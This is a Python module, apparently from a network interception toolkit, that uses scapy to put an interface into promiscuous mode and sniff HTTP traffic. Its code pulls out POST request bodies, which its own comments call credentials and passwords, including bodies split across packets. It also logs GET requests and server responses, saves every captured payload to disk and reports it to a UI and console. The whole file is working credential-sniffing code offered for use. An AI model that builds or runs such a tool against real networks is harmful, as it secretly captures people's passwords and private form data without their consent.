import scapy.all as scapy
import uuid
import time
import os
from . import STATUS, STOP_EVENT, CAPTURE_DIR
from .utils import log_msg

# Track streams where we saw a POST header but no body yet
interesting_streams = {} 

def packet_callback(packet):
    if STOP_EVENT.is_set(): return
    
    # 1. Basic TCP/Raw Filter
    if not (packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP)):
        return

    try:
        # Decode payload
        payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
        ip = packet[scapy.IP]
        tcp = packet[scapy.TCP]
        
        # Filter proxy noise (Port 10000)
        if tcp.sport == 10000 or tcp.dport == 10000: return 

        # --- CLASSIFICATION ---
        title = ""
        desc = ""
        type_class = "INFO"
        is_alert = False
        
        stream_key = (ip.src, tcp.sport)
        current_time = time.time()

        # Scenario 1: Credentials Found (Immediate Capture)
        if "POST " in payload:
            title = "POST REQUEST" 
            # Capture the body for the file/UI, but sanitized for console
            if "\r\n\r\n" in payload:
                _, desc = payload.split('\r\n\r\n', 1)
            else:
                desc = payload
            desc = desc.strip()
            
            # FILE/UI gets ALERT (Red), Console gets WARNING (Yellow/Standard)
            type_class = "ALERT" 
            is_alert = True
            
            if stream_key in interesting_streams:
                del interesting_streams[stream_key]

        # Scenario 3: Split Body Packet (The Password arriving later)
        elif stream_key in interesting_streams:
            if current_time - interesting_streams[stream_key] < 3.0:
                title = "POST BODY"
                desc = payload
                type_class = "ALERT"
                is_alert = True
                del interesting_streams[stream_key] 
            else:
                del interesting_streams[stream_key] 
                return

        # Scenario 4: Standard GET Requests
        elif "GET " in payload:
            title = "PAGE LOAD"
            desc = payload.split('\r\n')[0]
            type_class = "INFO"
            is_alert = True

        # Scenario 5: Server Responses (HTTP 200 OK, etc.)
        elif payload.startswith("HTTP/"):
            title = "SERVER RESPONSE"
            try:
                desc = payload.split('\r\n')[0]
            except:
                desc = "Server Status"
            type_class = "WARNING" 
            is_alert = True

        else:
            return 

        # --- DUPLICATE CHECK ---
        if not is_alert: return

        if len(STATUS["intercepted_data"]) > 0:
            last_entry = STATUS["intercepted_data"][-1]
            if last_entry["src"] == ip.src and last_entry["title"] == title:
                if last_entry["snippet"] == desc:
                    return 

        # --- SAVE & LOG ---
        
        # 1. GENERATE READABLE ID
        timestamp_str = time.strftime('%H%M%S')
        clean_ip = ip.src.replace('.', '-')
        clean_title = title.replace(" ", "-").upper()
        short_uuid = str(uuid.uuid4())[:4]
        
        readable_id = f"{timestamp_str}_{clean_ip}_{clean_title}_{short_uuid}"
        
        # 2. Write to Disk
        try:
            filepath = f"{CAPTURE_DIR}/{readable_id}.html"
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(payload)
        except: pass

        # 3. Update UI
        data_entry = {
            "id": readable_id,
            "time": time.strftime('%H:%M:%S'),
            "src": ip.src, 
            "dst": ip.dst,
            "title": title,          
            "snippet": desc, 
            "type": type_class
        }
        
        STATUS["intercepted_data"].append(data_entry)
        STATUS["all_intercepted_data"].append(data_entry)
        
        # 4. Log to Console
        # Using [!] prefix which typically denotes WARNING/Alert in standard logs
        if type_class == "ALERT":
            log_msg(f"[!] {title} captured from {ip.src}")

    except Exception:
        pass

def start_sniffer():
    interface = STATUS["interface"]
    from .utils import set_promiscuous_mode 
    set_promiscuous_mode(interface, True)
    try:
        scapy.sniff(iface=interface, store=0, prn=packet_callback, stop_filter=lambda p: STOP_EVENT.is_set())
    except Exception as e:
        log_msg(f"[!] Sniffer Error: {e}")
    finally:
        set_promiscuous_mode(interface, False)